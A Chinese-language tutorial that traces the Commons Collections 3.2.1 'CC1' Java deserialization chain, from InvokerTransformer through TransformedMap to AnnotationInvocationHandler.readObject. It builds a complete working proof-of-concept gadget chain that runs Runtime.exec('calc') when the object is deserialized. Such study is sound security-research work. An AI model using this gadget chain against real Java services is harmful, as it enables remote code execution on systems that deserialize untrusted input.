# CC1链的分析与利用

<!--more-->
## Commons Collections简介

**Apache Commons Collections** 是一个扩展了Java 标准库里的Collection 结构的第三方基础库，它提供了很多强有力的数据结构类型并实现了各种集合工具类。 作为Apache 开源项目的重要组件，被广泛运用于各种Java 应用的开发。

## 环境配置

**jdk版本**：jdk8u71以下，因为在该jdk版本以上这个漏洞已经被修复了

**下载链接**：https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html

**一、依赖配置**

先创建一个新的maven项目：

![QQ截图20240620185909](https://s2.loli.net/2024/06/20/8CwWvcpRoqa7LIN.png)

然后在文件pom.xml的中添加（这里是分析Commons Collections3.2.1版本下的一条反序列化漏洞链）：

```xml
    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
    </dependencies>
```

完成后重新加载一下即可。

**二、源码配置**

这个也是需要配置的，因为后面会用到jdk中的一些类，而这些类是class文件，不利于我们分析，我们需要它的.java文件，这就需要下载其对应源码。

下载：https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4

点击zip下载后解压，在/src/share/classes中找到sun文件，把其复制到jdk中src.zip的解压文件

![QQ截图20240620194911](https://s2.loli.net/2024/06/20/WUH1sDLCOuBo5Q9.png)

然后在idea中的项目结构处加载源路径

![QQ截图20240620194956](https://s2.loli.net/2024/06/20/3TGkUS5BNPFxrgc.png)

## 链子分析

### 终点类

终点类就是链子的最底端调用危险函数的地方，但这也是我们入手的地方。

接口Transformaer的tranform方法：

![image-20240617171948475](https://s2.loli.net/2024/06/20/hBtGMLYTeiREzjI.png)

然后看一下哪些类实现了该接口（IDEA中快捷键：ctrl+alt+b）：

**ChainedTransformer**

![QQ截图20240617180737](https://s2.loli.net/2024/06/20/KhLwZYMOoqTreJg.png)

这个类中的`transform`方法起到个链式调用的作用，就是把前一次的输出当作后一次的输入。

**ConstantTransformer**

![QQ截图20240617174351](https://s2.loli.net/2024/06/20/agiybjNGex4z6ko.png)

可以看到该类是接受一个任意对象然后都返回一个常量，而该常量又是由构造函数控制的。

**InvokerTransformer**

![QQ截图20240617180903](https://s2.loli.net/2024/06/20/fAVkM1iFENUQRvX.png)

这个类中的transform方法实现了个任意方法调用（因为其中的变量可以由构造函数控制）。可以利用其构造恶意方法进行代码执行。

测试一下：

```java
package org.example;
import org.apache.commons.collections.functors.InvokerTransformer;

public class CC1test{
    public static void main(String[] args)throws Exception {
        InvokerTransformer in = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        in.transform(Runtime.getRuntime());
    }
}
```

![QQ截图20240617180327](https://s2.loli.net/2024/06/20/sowzJMlB7ZGvDbq.png)

可以看到能够通过调用该类的transform方法进行恶意方法调用从而命令执行。其实就是其实现了个简单的反射功能，让我们把原本的两行写成了一行。那么这个类就是终点类了。

在正常反序列化分析思路中其实就找两个点，第一个是找哪个类中的方法有调用危险方法（终点类），第二个就是重写了readObject的类（起点类），很显然这里的`InvokerTransformer`是终点类。

所以接下来就是看谁调用了`InvokerTransformer.transform()`方法，

### checkSetValue()

查找一下`transform()`的用法（就是看哪里调用了`transform()`）：

![QQ截图20240617202933](https://s2.loli.net/2024/06/20/aLzbKg9HsPhw1RV.png)

发现`TransformedMap`类的 `checkSetValue()`里使用了 `valueTransformer`调用`transform()`，这个`valueTransformer`看名字就非常可疑，感觉应该是可控的参数，跟进到`TransformedMap`类中：

![QQ截图20240617203540](https://s2.loli.net/2024/06/20/urz9ZdoyFnbfRWv.png)

看到参数`valueTransformer`是保护+final属性，但发现该类的构造函数可以对`valueTransformer`进行赋值。

![QQ截图20240617203716](https://s2.loli.net/2024/06/20/78RMgHaFpeu1wJr.png)

可惜构造函数也是保护属性，只能自己调用。不要灰心继续找找看谁调用了该构造函数（有点像Rutime实例化的获得，不过其是私有属性）。

![QQ截图20240617203911](https://s2.loli.net/2024/06/20/vMaibBjLQWxuZTp.png)

发现是个公有静态方法可以调用。

那么现在就是可以通过调用`decorate`函数来进行`TransformedMap`类实例化从而让`valueTransformer`的值等于`InvokerTransformer`。

然后就是要调用`checkSetValue() `方法来实现上面`InvokerTransformer`中的`transform()`方法，但是从上面不难发现`checkSetValue()`是个保护属性的函数，所以又要去找找谁调用了`checkSetValue()`方法。

![QQ截图20240617211449](https://s2.loli.net/2024/06/20/EjuekWGmMKb49VF.png)

### setValue()

可以看到只有一个结果，跟进该类看看：

![QQ截图20240617211907](https://s2.loli.net/2024/06/20/qyGanZN36ADIuMo.png)

是个子类里面调用的，并且它的构造方法是保护属性，setValue方法倒是公有属性，但看来是不能直接实列化来调用setValue()方法了，

但是这里查看该方法调用结果太多了，有38个结果，主要是我也看不懂怎么调用的。先直接照着师傅们的构造调用一下吧：

```java
package org.example;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC1test {
    public static void main(String[] args)throws Exception {
        InvokerTransformer in = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        HashMap map=new HashMap();
        map.put("key","value");
        Map<Object,Object> t= TransformedMap.decorate(map,null,in);//静态方法staic修饰直接类名＋方法名调用
        for(Map.Entry entry : t.entrySet()){
            entry.setValue(Runtime.getRuntime());
        }
    }
}
```

 运行结果：

![QQ截图20240619185404](https://s2.loli.net/2024/06/20/1smr4XCkWZBnyJK.png)

大概解释一下为什么这里entry.setValue(Runtime.getRuntime());会调用到MapEntry中的setValue方法（虽然调试一下也知道）。这里其实就是在遍历Map中的键值对，而这里Map是TransformedMap对象修饰后的键值，TransformedMap是继承的AbstractInputCheckedMapDecorator类，AbstractInputCheckedMapDecorator类又继承AbstractMapDecorator类，MapEntry也是AbstractMapDecorator的副类，那么在调用setValue的时候就会调用到重新后的setValue方法也就是MapEntry中的setValue方法。
![QQ截图20240622211629](https://raw.githubusercontent.com/gaorenyusi/img/master/img/QQ%E6%88%AA%E5%9B%BE20240622211629.png)

（其实感觉就像反序列化最基础的readObject方法重写一样，为什么就一定会调用到重写readObject方法，因为序列化的对象就是这个类嘛。）

### readObject()

但是很显然这里并不是终点链，因为还没有涉及到反序列化。所以还是得找谁调用了setValue()方法，不过通过上面的自己构造调用来看，我们要找的类里面调用setValue方法估计也是以差不多的形式来调用的。

最后在`AnnotationInvocationHandle`类中找到了符合条件的情况。

![QQ截图20240619190410](https://s2.loli.net/2024/06/20/TMIl1d4NQ3np6Fv.png)

`memberValue`参数可控，而且发现还在readObject方法里面，这不妥妥起点类了嘛。

![QQ截图20240619192920](https://s2.loli.net/2024/06/20/juWYHpcPxGKoBCM.png)

但发现这个构造方法前面没有public属性，那么就是default类型。在java中，default类型只能在本包进行调用。说明这个类只能在sun.reflect.annotation这个包下被调用。

我们要想在外部调用，需要用到反射来解决，进行构造:

```java
package org.example;
import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC1test {
    public static void main(String[] args)throws Exception {
        InvokerTransformer in = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        HashMap map=new HashMap();
        map.put("key","value");
        Map<Object,Object> t= TransformedMap.decorate(map,null,in);//静态方法staic修饰直接类名＋方法名调用
        Class c=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor con=c.getDeclaredConstructor(Class.class, Map.class);
        con.setAccessible(true);
        Object obj=con.newInstance(Override.class,t);
        serilize(obj);
        deserilize("ser.bin");
    }
    public static void serilize(Object obj)throws IOException{
        ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream("ser.bin"));
        out.writeObject(obj);
    }
    public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{
        ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename));
        Object obj=in.readObject();
        return obj; 
    }
}
```

### 三个问题

当然这样是还调用不到`setValue`方法的，有两个`if`条件。而且就算调用了发现`setVlaue`参数是固定的，我们还根本没有把`Runtime.getRuntime()`这个参数传进去，而且`Runtime.getRuntime()`也不能进行序列化，因为`Runtime`没有序列化接口。

![QQ截图20240619200413](https://s2.loli.net/2024/06/20/Bhc2I5EHiVfrsk7.png)

**总结一下这里的几个问题：**

**一、**Runtime的序列化

**二、**setValue参数的改变

**三、**两个if条件的绕过

### 解决Runtime的序列化

因为Runtime是没有反序列化接口的的，所以其不能进行反序列化，但是可以把其变回原型类class，这个是存在`serilize`接口的：

![QQ截图20240619205805](https://s2.loli.net/2024/06/20/CBKvOJyrsp7xIjH.png)

在利用反射来调用其方法，下面是其反射调用的demo：

```java
public class CC1test {
    public static void main(String[] args)throws Exception {
        Class c1=Runtime.class;
        Runtime runtime = (Runtime) c1.getMethod("getRuntime",null).invoke(null);
        c1.getMethod("exec",String.class).invoke(runtime,"calc");
	}
}
```

不过这种写法下面照着改InvokerTransformer.tansform调用时不好对照，所以换一种详细的写法。

```java
public class CC1test {
    public static void main(String[] args)throws Exception {
        Class c1=Runtime.class;
        Method getruntime = c1.getMethod("getRuntime",null);
        Runtime runtime=(Runtime) getruntime.invoke(null,null);
        c1.getMethod("exec",String.class).invoke(runtime,"calc");
	}
}
```

然后利用InvokerTransformer.tansform来进行代替反射进行调用，因为需要InvokerTransformer.tansform来调用危险函数嘛。

```java
import org.apache.commons.collections.functors.InvokerTransformer;
import java.lang.reflect.Method;

public class CC1test {
    public static void main(String[] args)throws Exception {
        Method  getruntime=(Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
        Runtime runtime=(Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getruntime);
      new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(runtime);
        }
}
```

分析构造，这里其实就可以把`new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);`看作是调用`Runtime.class`的`getMethod`方法，参数是`("getRuntime",null)`。

剩下的如法炮制。

![QQ截图20240619213221](https://s2.loli.net/2024/06/20/ShK7PUjGqeatVOL.png)

但是这样要一个个嵌套创建参数太麻烦了(当然也必须这么改)，这里我们想起上面一个Commons Collections库中存在的ChainedTransformer类，它也存在transform方法可以帮我们遍历InvokerTransformer，并且调用transform方法:

再通俗一点讲就是上面说过的会把前一次的输出当作下一次的输入，这里transform的参数也就是上一次的输出，所以非常符合当前这种情况。

构造：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class CC1test {
    public static void main(String[] args)throws Exception {
        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),
        };
 
new ChainedTransformer(transformers).transform(Runtime.class);
```

简单分析一下就是建立一个数组把刚刚transform函数前面不同的值储存起来待会循环调用。然后只需传入参数Runtime.class就行了。

![QQ截图20240619214535](https://s2.loli.net/2024/06/20/296s5J8XdEoghtu.png)

那么解决了Runtime反序列化的问题，现在先加上反序列化的代码：

```java
package org.example;
import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC1test {
    public static void main(String[] args)throws Exception {

        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),
        };
        ChainedTransformer cha=new ChainedTransformer(transformers);
//        cha.transform(Runtime.class);
        
        HashMap<Object,Object> map=new HashMap<>();
        map.put("key","aaa");
        Map<Object,Object> tmap=TransformedMap.decorate(map,null,cha);//静态方法调用

        Class c=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor con=c.getDeclaredConstructor(Class.class, Map.class);
        con.setAccessible(true);
        Object obj=con.newInstance(Override.class,tmap); 
        serilize(obj);
        deserilize("ser.bin");
    }
    public static void serilize(Object obj)throws IOException{
        ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream("ser.bin"));
        out.writeObject(obj);
    }
    public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{
        ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename));
        Object obj=in.readObject();
        return obj;
   }
}
```

### 解决if条件

上面代码运行肯定是弹不了计算机的。看看调用setValue的地方：

![QQ截图20240620155520](https://s2.loli.net/2024/06/20/YCgMxqnVyA1afzj.png)

先不说setValue()方法的参数不是我们想要的，这里还有两个`if`条件，第一个if是要memberType != null，先看memberType是什么：

```java
Class<?> memberType = memberTypes.get(name);
```

而这里的name就是键值对中的建，memberTypes：

```java
Map<String, Class<?>> memberTypes = annotationType.memberTypes();
```

这个就是注解中成员变量的名称，但是上面的Override没有成员变量。换一个注解，这里用到Target

![QQ截图20240620161655](https://s2.loli.net/2024/06/20/evfXdanBzjJNti6.png)

其成员变量名称是value，所以把key设为value。再次进行调试：
![QQ截图20240620161832](https://s2.loli.net/2024/06/20/7VL9sER6SHvM5NK.png)

发现第二个if直接就符合条件了，顺利来到了setValue()，不过这里还是简单分析一下第二个if条件：

就是判断value是否是memberType和ExceptionProxy类型的实例，这里value传的是aaa字符串肯定实不符和。所以直接调用到了最后一步`setValue`方法。

### 解决setValue参数

到这里在理一遍思路，先把上面的代码粘下来：

```java
package org.example;
import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC1test {
    public static void main(String[] args)throws Exception {

        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),
        };
        ChainedTransformer cha=new ChainedTransformer(transformers);
//        cha.transform(Runtime.class);
        
        HashMap<Object,Object> map=new HashMap<>();
        map.put("key","aaa");
        Map<Object,Object> tmap=TransformedMap.decorate(map,null,cha);//静态方法调用

        Class c=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor con=c.getDeclaredConstructor(Class.class, Map.class);
        con.setAccessible(true);
        Object obj=con.newInstance(Override.class,tmap); 
        serilize(obj);
        deserilize("ser.bin");
    }
    public static void serilize(Object obj)throws IOException{
        ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream("ser.bin"));
        out.writeObject(obj);
    }
    public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{
        ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename));
        Object obj=in.readObject();
        return obj;
   }
}
```

首先是通过`InvokerTransformer`类的`transform`方法来反射调用`Runtime.getRuntime`的`exec`方法执行危险命令。

后面由于需要`Runtim`e序列化，所以要利用`Runtime.class`来一步一步调用到危险函数（也就是选调用到`getRuntime`方法然后再调用到`exec`方法）所以连续用了几次`InvokerTransformer`类的`transform`方法。但是后面序列化肯定只有`Runtime.class`一个参数传进去，所以又利用了`ChainedTransformer`类。它的`transform`方法可以实现迭代调用`transform`方法，这样就只用传入`Runtime.class`就可以直接执行到最后的`calc`了（当然这是手动调用）。

然后就是利用`TransformedMap`类`checkSetValue`方法来调用`ChainedTransformer`类的`transform`，在这之前，利用`TransformedMap.decorate`静态方法来实现`TransformedMap`类的实例化主要需要调用其构造方法让参数`valueTransformer`的值等于`ChainedTransformer`，这样`checkSetValue`才能算是调用`ChainedTransformer`的`transform`方法，

但由于这里`checkSetValue`是保护属性，所以又要利用`MapEntry`类的`setValue`方法来调用`checkSetValue`方法，由于`MapEntry`是个子类且其继承了`Map.Entry`接口可以在使用上面`Map`遍历的形式调用到`MapEntry`类的`setValue`方法（这是手动）

最后发现`AnnotationInvocationHandler`类中的`readObject`方法中刚好有这个`Map`遍历，至此到`readObject`就算完成了最后一个类，虽然其是`defualt`属性，但还是可以利用反射来达到调用。到这里只需要解决最后一个问题，就是`setValue`的参数问题，因为这个`setValue`的参数也就是最后`transform`的参数。

发现前面提到的类`ConstantTransformer`可以把接受的任何参数都返回一个常量并且常量可控。

![QQ截图20240617174351](https://s2.loli.net/2024/06/20/agiybjNGex4z6ko.png)

那么构造：

```java
package org.example;
import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC1test {
    public static void main(String[] args)throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),
        };
        ChainedTransformer cha=new ChainedTransformer(transformers);
//        cha.transform(Runtime.class);

        HashMap<Object,Object> map=new HashMap<>();
        map.put("value","aaa");
        Map<Object,Object> tmap=TransformedMap.decorate(map,null,cha);//静态方法调用


        Class c=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor con=c.getDeclaredConstructor(Class.class, Map.class);
        con.setAccessible(true);
        Object obj=con.newInstance(Target.class,tmap); 
        serilize(obj);
        deserilize("ser.bin");
    }
    public static void serilize(Object obj)throws IOException{
        ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream("ser.bin"));
        out.writeObject(obj);
    }
    public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{
        ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename));
        Object obj=in.readObject();
        return obj;
   }
}
```

这样不管`setValue`是什么参数当传入到最后 `ChainedTransformer.transforme`时会通过`ConstantTransformer`的`transforme`方法返回`Runtime.class`固定参数，这样最后迭代一样可以执行到`calc`。

所以这条链也就结束了，从`readObject`开始可以一步一步到最后恶意命令执行。

## 总结

主要的函数调用就是：

transform ---->checkSetValue ----> setValue ----> readObject 

只是其中穿插了一些其他需要解决的问题。

